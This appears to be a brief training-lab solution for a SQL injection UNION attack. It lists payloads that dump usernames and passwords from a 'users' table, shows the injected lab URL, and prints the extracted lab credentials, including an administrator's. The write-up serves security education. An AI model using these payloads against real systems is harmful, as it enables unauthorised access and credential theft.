# Lab: SQL injection UNION attack, retrieving data from other tables
## Description
Use SQL Injection with UNION select to retrive data from table `users` and extract data from the column `password`.

## Solution
The following payloads

 ```
 '+UNION+SELECT+password,NULL+FROM+users--
 '+UNION+SELECT+username,NULL+FROM+users--
 '+UNION+SELECT+username,password+FROM+users--
 ```
 
Was injected into the `category`:
```
https://acfb1fb51e067f55c07eaa4c00570045.web-security-academy.net/filter?category=Accessories'+UNION+SELECT+password,NULL+FROM+users--
```

The username/password was then returned in the HTTP response. The following credentials was extracted:
```
administrator:84c2dnxgpa2g1jgj4gbx
carlos:xtbulbofr8en38e58vet
wiener:uuxbdfclvz07j61hvze7
```



